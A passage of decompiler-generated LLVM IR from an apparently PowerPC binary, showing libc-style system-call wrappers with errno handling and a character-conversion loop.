
dec_label_pc_10009790:                            ; preds = %dec_label_pc_1000975c, %dec_label_pc_10009784
  %v0_100097a0 = phi i32 [ %v0_10009774, %dec_label_pc_1000975c ], [ -1, %dec_label_pc_10009784 ]
  ret i32 %v0_100097a0

; uselistorder directives
  uselistorder label %dec_label_pc_10009790, { 1, 0 }
}

define i32 @function_100097a4() local_unnamed_addr {
dec_label_pc_100097a4:
  %r31.global-to-local = alloca i32, align 4
  %v0_100097bc = call i32 @__asm_mfcr()
  %v1_100097c0 = and i32 %v0_100097bc, 268435456
  %v3_100097c0 = icmp eq i32 %v1_100097c0, 0
  store i32 %v0_100097bc, i32* %r31.global-to-local, align 4
  br i1 %v3_100097c0, label %dec_label_pc_100097d8, label %dec_label_pc_100097cc

dec_label_pc_100097cc:                            ; preds = %dec_label_pc_100097a4
  %v0_100097cc = call i32 @function_10004e38()
  %v0_100097d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100097d0 = inttoptr i32 %v0_100097cc to i32*
  store i32 %v0_100097d0, i32* %v2_100097d0, align 4
  br label %dec_label_pc_100097d8

dec_label_pc_100097d8:                            ; preds = %dec_label_pc_100097a4, %dec_label_pc_100097cc
  %v0_100097e8 = phi i32 [ %v0_100097bc, %dec_label_pc_100097a4 ], [ -1, %dec_label_pc_100097cc ]
  ret i32 %v0_100097e8

; uselistorder directives
  uselistorder label %dec_label_pc_100097d8, { 1, 0 }
}

define i32 @function_100097ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_100097ec:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009804 = call i32 @__asm_mfcr()
  %v1_10009808 = and i32 %v0_10009804, 268435456
  %v3_10009808 = icmp eq i32 %v1_10009808, 0
  store i32 %v0_10009804, i32* %r31.global-to-local, align 4
  br i1 %v3_10009808, label %dec_label_pc_10009820, label %dec_label_pc_10009814

dec_label_pc_10009814:                            ; preds = %dec_label_pc_100097ec
  %v0_10009814 = call i32 @function_10004e38()
  %v0_10009818 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009818 = inttoptr i32 %v0_10009814 to i32*
  store i32 %v0_10009818, i32* %v2_10009818, align 4
  br label %dec_label_pc_10009820

dec_label_pc_10009820:                            ; preds = %dec_label_pc_100097ec, %dec_label_pc_10009814
  %v0_10009830 = phi i32 [ %v0_10009804, %dec_label_pc_100097ec ], [ -1, %dec_label_pc_10009814 ]
  ret i32 %v0_10009830

; uselistorder directives
  uselistorder label %dec_label_pc_10009820, { 1, 0 }
}

define i32 @function_10009834(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009834:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000984c = call i32 @__asm_mfcr()
  %v1_10009850 = and i32 %v0_1000984c, 268435456
  %v3_10009850 = icmp eq i32 %v1_10009850, 0
  store i32 %v0_1000984c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009850, label %dec_label_pc_10009868, label %dec_label_pc_1000985c

dec_label_pc_1000985c:                            ; preds = %dec_label_pc_10009834
  %v0_1000985c = call i32 @function_10004e38()
  %v0_10009860 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009860 = inttoptr i32 %v0_1000985c to i32*
  store i32 %v0_10009860, i32* %v2_10009860, align 4
  br label %dec_label_pc_10009868

dec_label_pc_10009868:                            ; preds = %dec_label_pc_10009834, %dec_label_pc_1000985c
  %v0_10009878 = phi i32 [ %v0_1000984c, %dec_label_pc_10009834 ], [ -1, %dec_label_pc_1000985c ]
  ret i32 %v0_10009878

; uselistorder directives
  uselistorder label %dec_label_pc_10009868, { 1, 0 }
}

define i32 @function_1000987c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000987c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009894 = call i32 @__asm_mfcr()
  %v1_10009898 = and i32 %v0_10009894, 268435456
  %v3_10009898 = icmp eq i32 %v1_10009898, 0
  store i32 %v0_10009894, i32* %r31.global-to-local, align 4
  br i1 %v3_10009898, label %dec_label_pc_100098b0, label %dec_label_pc_100098a4

dec_label_pc_100098a4:                            ; preds = %dec_label_pc_1000987c
  %v0_100098a4 = call i32 @function_10004e38()
  %v0_100098a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100098a8 = inttoptr i32 %v0_100098a4 to i32*
  store i32 %v0_100098a8, i32* %v2_100098a8, align 4
  br label %dec_label_pc_100098b0

dec_label_pc_100098b0:                            ; preds = %dec_label_pc_1000987c, %dec_label_pc_100098a4
  %v0_100098c0 = phi i32 [ %v0_10009894, %dec_label_pc_1000987c ], [ -1, %dec_label_pc_100098a4 ]
  ret i32 %v0_100098c0

; uselistorder directives
  uselistorder label %dec_label_pc_100098b0, { 1, 0 }
}

define i32 @function_100098c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100098c4:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100098d8 = and i32 %arg2, 64
  %v3_100098d8 = icmp eq i32 %v1_100098d8, 0
  br i1 %v3_100098d8, label %dec_label_pc_10009904, label %dec_label_pc_100098e8

dec_label_pc_100098e8:                            ; preds = %dec_label_pc_100098c4
  %v2_100098f0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100098f0, i32* %stack_var_-32, align 4
  %v0_10009900 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10009904

dec_label_pc_10009904:                            ; preds = %dec_label_pc_100098c4, %dec_label_pc_100098e8
  %v0_10009904 = phi i32 [ 0, %dec_label_pc_100098c4 ], [ %v0_10009900, %dec_label_pc_100098e8 ]
  store i32 %v0_10009904, i32* @r5, align 4
  %v0_1000990c = call i32 @__asm_mfcr()
  %v1_10009910 = and i32 %v0_1000990c, 268435456
  %v3_10009910 = icmp eq i32 %v1_10009910, 0
  store i32 %v0_1000990c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009910, label %dec_label_pc_10009928, label %dec_label_pc_1000991c

dec_label_pc_1000991c:                            ; preds = %dec_label_pc_10009904
  %v0_1000991c = call i32 @function_10004e38()
  %v0_10009920 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009920 = inttoptr i32 %v0_1000991c to i32*
  store i32 %v0_10009920, i32* %v2_10009920, align 4
  br label %dec_label_pc_10009928

dec_label_pc_10009928:                            ; preds = %dec_label_pc_10009904, %dec_label_pc_1000991c
  %v0_10009938 = phi i32 [ %v0_1000990c, %dec_label_pc_10009904 ], [ -1, %dec_label_pc_1000991c ]
  ret i32 %v0_10009938

; uselistorder directives
  uselistorder label %dec_label_pc_10009928, { 1, 0 }
  uselistorder label %dec_label_pc_10009904, { 1, 0 }
}

define i32 @function_1000993c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000993c:
  store i32 %arg1, i32* @r5, align 4
  %v2_10009948 = call i32 @function_100098c4(i32 577, i32 577)
  ret i32 %v2_10009948

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_100098c4, { 2, 0, 1 }
  uselistorder i32 577, { 1, 2, 0, 3 }
}

define i32 @function_1000994c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000994c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009964 = call i32 @__asm_mfcr()
  %v1_10009968 = and i32 %v0_10009964, 268435456
  %v3_10009968 = icmp eq i32 %v1_10009968, 0
  store i32 %v0_10009964, i32* %r31.global-to-local, align 4
  br i1 %v3_10009968, label %dec_label_pc_10009980, label %dec_label_pc_10009974

dec_label_pc_10009974:                            ; preds = %dec_label_pc_1000994c
  %v0_10009974 = call i32 @function_10004e38()
  %v0_10009978 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009978 = inttoptr i32 %v0_10009974 to i32*
  store i32 %v0_10009978, i32* %v2_10009978, align 4
  br label %dec_label_pc_10009980

dec_label_pc_10009980:                            ; preds = %dec_label_pc_1000994c, %dec_label_pc_10009974
  %v0_10009990 = phi i32 [ %v0_10009964, %dec_label_pc_1000994c ], [ -1, %dec_label_pc_10009974 ]
  ret i32 %v0_10009990

; uselistorder directives
  uselistorder label %dec_label_pc_10009980, { 1, 0 }
}

define i32 @function_10009994(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009994:
  store i32 %arg1, i32* @r30, align 4
  %v3_100099b0 = load i32, i32* @global_var_100104dc.296, align 4
  %v3_100099b4 = icmp eq i32 %v3_100099b0, 0
  br i1 %v3_100099b4, label %dec_label_pc_100099bc, label %dec_label_pc_100099c8

dec_label_pc_100099bc:                            ; preds = %dec_label_pc_10009994
  store i32 268474816, i32* @lr, align 4
  %v1_100099bc = call i32 @function_1000baac(i32 0)
  %v1_100099c0 = icmp slt i32 %v1_100099bc, 0
  br i1 %v1_100099c0, label %dec_label_pc_100099e8, label %dec_label_pc_100099bc.dec_label_pc_100099c8_crit_edge

dec_label_pc_100099bc.dec_label_pc_100099c8_crit_edge: ; preds = %dec_label_pc_100099bc
  %v0_100099c8.pre = load i32, i32* @r30, align 4
  %v3_100099cc.pre = load i32, i32* @global_var_100104dc.296, align 4
  br label %dec_label_pc_100099c8

dec_label_pc_100099c8:                            ; preds = %dec_label_pc_100099bc.dec_label_pc_100099c8_crit_edge, %dec_label_pc_10009994
  %v3_100099cc = phi i32 [ %v3_100099cc.pre, %dec_label_pc_100099bc.dec_label_pc_100099c8_crit_edge ], [ %v3_100099b0, %dec_label_pc_10009994 ]
  %v1_100099d4 = phi i32 [ %v0_100099c8.pre, %dec_label_pc_100099bc.dec_label_pc_100099c8_crit_edge ], [ %arg1, %dec_label_pc_10009994 ]
  %v3_100099c8 = icmp eq i32 %v1_100099d4, 0
  store i32 %v3_100099cc, i32* @r31, align 4
  br i1 %v3_100099c8, label %dec_label_pc_100099ec, label %dec_label_pc_100099dc

dec_label_pc_100099dc:                            ; preds = %dec_label_pc_100099c8
  %v2_100099d4 = add i32 %v1_100099d4, %v3_100099cc
  store i32 268474848, i32* @lr, align 4
  %v1_100099dc = call i32 @function_1000baac(i32 %v2_100099d4)
  %tmp6 = icmp sgt i32 %v1_100099dc, -1
  br i1 %tmp6, label %dec_label_pc_100099dc.dec_label_pc_100099ec_crit_edge, label %dec_label_pc_100099e8

dec_label_pc_100099dc.dec_label_pc_100099ec_crit_edge: ; preds = %dec_label_pc_100099dc
  %v0_100099f0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100099ec

dec_label_pc_100099e8:                            ; preds = %dec_label_pc_100099dc, %dec_label_pc_100099bc
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_100099ec

dec_label_pc_100099ec:                            ; preds = %dec_label_pc_100099dc.dec_label_pc_100099ec_crit_edge, %dec_label_pc_100099c8, %dec_label_pc_100099e8
  %v0_100099f0 = phi i32 [ %v0_100099f0.pre, %dec_label_pc_100099dc.dec_label_pc_100099ec_crit_edge ], [ %v3_100099cc, %dec_label_pc_100099c8 ], [ -1, %dec_label_pc_100099e8 ]
  ret i32 %v0_100099f0

; uselistorder directives
  uselistorder i32 %v3_100099cc, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1000baac, { 1, 0 }
  uselistorder label %dec_label_pc_100099ec, { 2, 0, 1 }
}

define i32 @function_10009a04(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009a04:
  %r31.global-to-local = alloca i32, align 4
  %v3_10009a04 = icmp eq i32 %arg2, 0
  br i1 %v3_10009a04, label %dec_label_pc_10009a44, label %dec_label_pc_10009a2c

dec_label_pc_10009a2c:                            ; preds = %dec_label_pc_10009a04
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_10009a44, label %dec_label_pc_10009a34

dec_label_pc_10009a34:                            ; preds = %dec_label_pc_10009a2c
  %v0_10009a34 = call i32 @function_10004e38()
  %v2_10009a3c = inttoptr i32 %v0_10009a34 to i32*
  store i32 22, i32* %v2_10009a3c, align 4
  %v0_10009a68.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009a64

dec_label_pc_10009a44:                            ; preds = %dec_label_pc_10009a2c, %dec_label_pc_10009a04
  %v0_10009a48 = call i32 @__asm_mfcr()
  %v1_10009a4c = and i32 %v0_10009a48, 268435456
  %v3_10009a4c = icmp eq i32 %v1_10009a4c, 0
  store i32 %v0_10009a48, i32* %r31.global-to-local, align 4
  br i1 %v3_10009a4c, label %dec_label_pc_10009a64, label %dec_label_pc_10009a58

dec_label_pc_10009a58:                            ; preds = %dec_label_pc_10009a44
  %v0_10009a58 = call i32 @function_10004e38()
  %v0_10009a5c = load i32, i32* %r31.global-to-local, align 4
  %v2_10009a5c = inttoptr i32 %v0_10009a58 to i32*
  store i32 %v0_10009a5c, i32* %v2_10009a5c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009a64

dec_label_pc_10009a64:                            ; preds = %dec_label_pc_10009a44, %dec_label_pc_10009a34, %dec_label_pc_10009a58
  %v0_10009a68 = phi i32 [ %v0_10009a48, %dec_label_pc_10009a44 ], [ %v0_10009a68.pre, %dec_label_pc_10009a34 ], [ -1, %dec_label_pc_10009a58 ]
  ret i32 %v0_10009a68

; uselistorder directives
  uselistorder label %dec_label_pc_10009a64, { 2, 0, 1 }
}

define i32 @function_10009a7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009a7c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009a94 = call i32 @__asm_mfcr()
  %v1_10009a98 = and i32 %v0_10009a94, 268435456
  %v3_10009a98 = icmp eq i32 %v1_10009a98, 0
  store i32 %v0_10009a94, i32* %r31.global-to-local, align 4
  br i1 %v3_10009a98, label %dec_label_pc_10009ab0, label %dec_label_pc_10009aa4

dec_label_pc_10009aa4:                            ; preds = %dec_label_pc_10009a7c
  %v0_10009aa4 = call i32 @function_10004e38()
  %v0_10009aa8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009aa8 = inttoptr i32 %v0_10009aa4 to i32*
  store i32 %v0_10009aa8, i32* %v2_10009aa8, align 4
  br label %dec_label_pc_10009ab0

dec_label_pc_10009ab0:                            ; preds = %dec_label_pc_10009a7c, %dec_label_pc_10009aa4
  %v0_10009ac0 = phi i32 [ %v0_10009a94, %dec_label_pc_10009a7c ], [ -1, %dec_label_pc_10009aa4 ]
  ret i32 %v0_10009ac0

; uselistorder directives
  uselistorder label %dec_label_pc_10009ab0, { 1, 0 }
}

define i32 @function_10009ac4() local_unnamed_addr {
dec_label_pc_10009ac4:
  ret i32 ptrtoint (i32* @global_var_100104c0.298 to i32)
}

define i32 @function_10009ad0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009ad0:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10009ad0 = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_10009aec = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10009aec, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10009ad0, label %dec_label_pc_10009af8, label %dec_label_pc_10009b00

dec_label_pc_10009af8:                            ; preds = %dec_label_pc_10009ad0
  %v2_10009af8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10009af8, i32* @r3, align 4
  br label %dec_label_pc_10009b00

dec_label_pc_10009b00:                            ; preds = %dec_label_pc_10009ad0, %dec_label_pc_10009af8
  %v0_10009b04 = phi i32 [ %arg2, %dec_label_pc_10009ad0 ], [ 0, %dec_label_pc_10009af8 ]
  %v2_10009b00 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_10009b04, i32* %stack_var_-40, align 4
  store i32 %v2_10009b00, i32* %stack_var_-36, align 4
  store i32 268475152, i32* @lr, align 4
  %v0_10009b0c = call i32 @function_10009b3c()
  %v3_10009b10 = icmp eq i32 %v0_10009b0c, 0
  br i1 %v3_10009b10, label %dec_label_pc_10009b18, label %dec_label_pc_10009b1c

dec_label_pc_10009b18:                            ; preds = %dec_label_pc_10009b00
  br label %dec_label_pc_10009b1c

dec_label_pc_10009b1c:                            ; preds = %dec_label_pc_10009b00, %dec_label_pc_10009b18
  %v0_10009b28 = phi i32 [ %v0_10009b0c, %dec_label_pc_10009b00 ], [ 1, %dec_label_pc_10009b18 ]
  ret i32 %v0_10009b28

; uselistorder directives
  uselistorder label %dec_label_pc_10009b1c, { 1, 0 }
  uselistorder label %dec_label_pc_10009b00, { 1, 0 }
}

define i32 @function_10009b2c() local_unnamed_addr {
dec_label_pc_10009b2c:
  %v0_10009b30 = load i32, i32* @r5, align 4
  store i32 %v0_10009b30, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_10009b38 = call i32 @function_10009b3c()
  ret i32 %v0_10009b38

; uselistorder directives
  uselistorder i32 ()* @function_10009b3c, { 1, 0 }
}

define i32 @function_10009b3c() local_unnamed_addr {
dec_label_pc_10009b3c:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10009b3c = load i32, i32* @r3, align 4
  %v3_10009b3c = icmp eq i32 %v0_10009b3c, 0
  %v0_10009b40 = load i32, i32* @lr, align 4
  store i32 %v0_10009b40, i32* %r0.global-to-local, align 4
  br i1 %v3_10009b3c, label %dec_label_pc_10009b68, label %dec_label_pc_10009b50

dec_label_pc_10009b50:                            ; preds = %dec_label_pc_10009b3c
  %v1_10009b50 = load i32, i32* @r4, align 4
  %v4_10009b50 = icmp eq i32 %v0_10009b3c, %v1_10009b50
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_10009b50, label %dec_label_pc_10009b5c, label %dec_label_pc_10009b94

dec_label_pc_10009b5c:                            ; preds = %dec_label_pc_10009b50
  %v2_10009b60 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009b60, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009b94

dec_label_pc_10009b68:                            ; preds = %dec_label_pc_10009b3c
  %v2_10009b6011 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009b6011, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10009b94

dec_label_pc_10009b74:                            ; preds = %dec_label_pc_10009bd4.dec_label_pc_10009bb4_crit_edge, %dec_label_pc_10009bb4.preheader
  %v0_10009b74 = call i32 @function_10004e38()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10009b80 = inttoptr i32 %v0_10009b74 to i32*
  store i32 84, i32* %v2_10009b80, align 4
  %v0_10009bf8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009bf4

dec_label_pc_10009b88:                            ; preds = %dec_label_pc_10009bc4
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10009be4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10009be0

dec_label_pc_10009b94:                            ; preds = %dec_label_pc_10009b5c, %dec_label_pc_10009b50, %dec_label_pc_10009b68
  %v2_10009bc47 = phi i32 [ %v2_10009b60, %dec_label_pc_10009b5c ], [ %v0_10009b3c, %dec_label_pc_10009b50 ], [ %v2_10009b6011, %dec_label_pc_10009b68 ]
  %v0_10009b94 = load i32, i32* @r5, align 4
  %v1_10009b94 = load i32, i32* @r6, align 4
  %v3_10009b94 = icmp ugt i32 %v0_10009b94, %v1_10009b94
  br i1 %v3_10009b94, label %dec_label_pc_10009b9c, label %dec_label_pc_10009ba0

dec_label_pc_10009b9c:                            ; preds = %dec_label_pc_10009b94
  store i32 %v1_10009b94, i32* @r5, align 4
  br label %dec_label_pc_10009ba0

dec_label_pc_10009ba0:                            ; preds = %dec_label_pc_10009b94, %dec_label_pc_10009b9c
  %v0_10009bac = phi i32 [ %v0_10009b94, %dec_label_pc_10009b94 ], [ %v1_10009b94, %dec_label_pc_10009b9c ]
  %v1_10009ba0 = add i32 %v0_10009bac, 1
  store i32 %v1_10009ba0, i32* %r0.global-to-local, align 4
  %v0_10009ba4 = load i32, i32* @r4, align 4
  %v1_10009ba4 = inttoptr i32 %v0_10009ba4 to i32*
  %v2_10009ba4 = load i32, i32* %v1_10009ba4, align 4
  store i32 %v2_10009ba4, i32* %r11.global-to-local, align 4
  store i32 %v0_10009bac, i32* %r9.global-to-local, align 4
  store i32 %v0_10009bac, i32* %ctr.global-to-local, align 4
  %v2_10009bdc3 = icmp eq i32 %v0_10009bac, 0
  br i1 %v2_10009bdc3, label %dec_label_pc_10009be0, label %dec_label_pc_10009bb4.preheader

dec_label_pc_10009bb4.preheader:                  ; preds = %dec_label_pc_10009ba0
  %v1_10009bb416 = inttoptr i32 %v2_10009ba4 to i32*
  %v2_10009bb417 = load i32, i32* %v1_10009bb416, align 4
  store i32 %v2_10009bb417, i32* %r0.global-to-local, align 4
  %v1_10009bb818 = add i32 %v2_10009ba4, 4
  store i32 %v1_10009bb818, i32* %r11.global-to-local, align 4
  %v2_10009bbc20 = icmp ugt i32 %v2_10009bb417, 127
  br i1 %v2_10009bbc20, label %dec_label_pc_10009b74, label %dec_label_pc_10009bc4.lr.ph

dec_label_pc_10009bc4.lr.ph:                      ; preds = %dec_label_pc_10009bb4.preheader
  %extract.t = trunc i32 %v2_10009bb417 to i8
  br label %dec_label_pc_10009bc4

dec_label_pc_10009bc4:                            ; preds = %dec_label_pc_10009bc4.lr.ph, %dec_label_pc_10009bd4.dec_label_pc_10009bb4_crit_edge
  %v2_10009bb423.off0 = phi i8 [ %extract.t, %dec_label_pc_10009bc4.lr.ph ], [ %extract.t24, %dec_label_pc_10009bd4.dec_label_pc_10009bb4_crit_edge ]
  %v2_10009bc422 = phi i32 [ %v2_10009bc47, %dec_label_pc_10009bc4.lr.ph ], [ %v2_10009bd4, %dec_label_pc_10009bd4.dec_label_pc_10009bb4_crit_edge ]
  %v3_10009bc4 = inttoptr i32 %v2_10009bc422 to i8*
  store i8 %v2_10009bb423.off0, i8* %v3_10009bc4, align 1
  %v0_10009bc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009bc8 = urem i32 %v0_10009bc8, 256
  store i32 %v1_10009bc8, i32* %r0.global-to-local, align 4
  %v3_10009bcc = icmp eq i32 %v1_10009bc8, 0
  br i1 %v3_10009bcc, label %dec_label_pc_10009b88, label %dec_label_pc_10009bd4

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009bc4
  %v0_10009bd4 = load i32, i32* @r3, align 4
  %v1_10009bd4 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009bd4 = add i32 %v1_10009bd4, %v0_10009bd4
  store i32 %v2_10009bd4, i32* @r3, align 4
  %v0_10009bd8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bd8 = add i32 %v0_10009bd8, -1
  store i32 %v1_10009bd8, i32* %r9.global-to-local, align 4
  %v0_10009bdc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009bdc = add i32 %v0_10009bdc, -1
  store i32 %v1_10009bdc, i32* %ctr.global-to-local, align 4
  %v2_10009bdc = icmp eq i32 %v1_10009bdc, 0
  br i1 %v2_10009bdc, label %dec_label_pc_10009be0, label %dec_label_pc_10009bd4.dec_label_pc_10009bb4_crit_edge

dec_label_pc_10009bd4.dec_label_pc_10009bb4_crit_edge: ; preds = %dec_label_pc_10009bd4
  %v0_10009bb4.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10009bb4 = inttoptr i32 %v0_10009bb4.pre to i32*
  %v2_10009bb4 = load i32, i32* %v1_10009bb4, align 4
  store i32 %v2_10009bb4, i32* %r0.global-to-local, align 4
  %v1_10009bb8 = add i32 %v0_10009bb4.pre, 4
  store i32 %v1_10009bb8, i32* %r11.global-to-local, align 4
  %v2_10009bbc = icmp ugt i32 %v2_10009bb4, 127
  %extract.t24 = trunc i32 %v2_10009bb4 to i8
  br i1 %v2_10009bbc, label %dec_label_pc_10009b74, label %dec_label_pc_10009bc4

dec_label_pc_10009be0:                            ; preds = %dec_label_pc_10009bd4, %dec_label_pc_10009ba0, %dec_label_pc_10009b88
  %v0_10009be4 = phi i32 [ %v0_10009be4.pre, %dec_label_pc_10009b88 ], [ %v2_10009bc47, %dec_label_pc_10009ba0 ], [ %v2_10009bd4, %dec_label_pc_10009bd4 ]
  %v2_10009be0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009be0, i32* %r0.global-to-local, align 4
  %v4_10009be4 = icmp eq i32 %v0_10009be4, %v2_10009be0
  br i1 %v4_10009be4, label %dec_label_pc_10009bf0, label %dec_label_pc_10009bec

dec_label_pc_10009bec:                            ; preds = %dec_label_pc_10009be0
  %v0_10009bec = load i32, i32* %r11.global-to-local, align 4
  %v1_10009bec = load i32, i32* @r4, align 4
  %v2_10009bec = inttoptr i32 %v1_10009bec to i32*
  store i32 %v0_10009bec, i32* %v2_10009bec, align 4
  br label %dec_label_pc_10009bf0

dec_label_pc_10009bf0:                            ; preds = %dec_label_pc_10009be0, %dec_label_pc_10009bec
  %v0_10009bf0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bf0 = load i32, i32* @r5, align 4
  %v2_10009bf0 = sub i32 %v1_10009bf0, %v0_10009bf0
  store i32 %v2_10009bf0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009bf4

dec_label_pc_10009bf4:                            ; preds = %dec_label_pc_10009b74, %dec_label_pc_10009bf0
  %v0_10009bf8 = phi i32 [ %v0_10009bf8.pre, %dec_label_pc_10009b74 ], [ %v2_10009bf0, %dec_label_pc_10009bf0 ]
  store i32 %v0_10009b40, i32* %r0.global-to-local, align 4
  ret i32 %v0_10009bf8

; uselistorder directives
  uselistorder i32 %v1_10009bdc, { 1, 0 }
  uselistorder i32 %v2_10009bd4, { 0, 2, 1 }
  uselistorder i32 %v1_10009bc8, { 1, 0 }
  uselistorder i32 %v0_10009bac, { 2, 3, 0, 1 }
  uselistorder i32 %v2_10009bc47, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10009bf4, { 1, 0 }
  uselistorder label %dec_label_pc_10009bf0, { 1, 0 }
  uselistorder label %dec_label_pc_10009bc4, { 1, 0 }
  uselistorder label %dec_label_pc_10009ba0, { 1, 0 }
  uselistorder label %dec_label_pc_10009b94, { 2, 0, 1 }
}

define i32 @function_10009c08(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009c08:
  %v0_10009c0c = load i32, i32* @lr, align 4
  store i32 268475436, i32* @lr, align 4
  %v2_10009c28 = call i32 @function_100095a8(i32 3, i32 3)
  %v3_10009c2c = icmp eq i32 %v2_10009c28, -1
  store i32 %arg1, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br i1 %v3_10009c2c, label %dec_label_pc_10009c54, label %dec_label_pc_10009c40

dec_label_pc_10009c40:                            ; preds = %dec_label_pc_10009c08
  store i32 %v0_10009c0c, i32* @lr, align 4
  %v4_10009c50 = inttoptr i32 %arg2 to i8*
  %v5_10009c50 = call i32 @function_10005434(i32 %v2_10009c28, i8* %v4_10009c50)
  br label %dec_label_pc_10009c54

dec_label_pc_10009c54:                            ; preds = %dec_label_pc_10009c08, %dec_label_pc_10009c40
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_100095a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009c54, { 1, 0 }
}

define i32 @function_10009c6c(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009c6c:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10009c6c = load i32, i32* @lr, align 4
  store i32 %v0_10009c6c, i32* %r0.global-to-local, align 4
  %v0_10009c78 = load i32, i32* @r5, align 4
  store i32 %v0_10009c78, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10009c78, i32* @r31, align 4
  %v3_10009c8c3 = icmp eq i32 %v0_10009c78, 0
  store i32 %v0_10009c78, i32* @r27, align 4
  br i1 %v3_10009c8c3, label %dec_label_pc_10009d34, label %dec_label_pc_10009c9c

dec_label_pc_10009c9c:                            ; preds = %dec_label_pc_10009c6c, %dec_label_pc_10009cbc
  %v0_10009cac = phi i32 [ %v2_10009cbc, %dec_label_pc_10009cbc ], [ %arg2, %dec_label_pc_10009c6c ]
  %v1_10009c9c.in = phi i32 [ %v2_10009cc0, %dec_label_pc_10009cbc ], [ %v0_10009c78, %dec_label_pc_10009c6c ]
  %v1_10009c9c = icmp sgt i32 %v1_10009c9c.in, 0
  br i1 %v1_10009c9c, label %dec_label_pc_10009ca8, label %dec_label_pc_10009ca0

dec_label_pc_10009ca0:                            ; preds = %dec_label_pc_10009c9c
  br label %dec_label_pc_10009ca8

dec_label_pc_10009ca8:                            ; preds = %dec_label_pc_10009c9c, %dec_label_pc_10009ca0
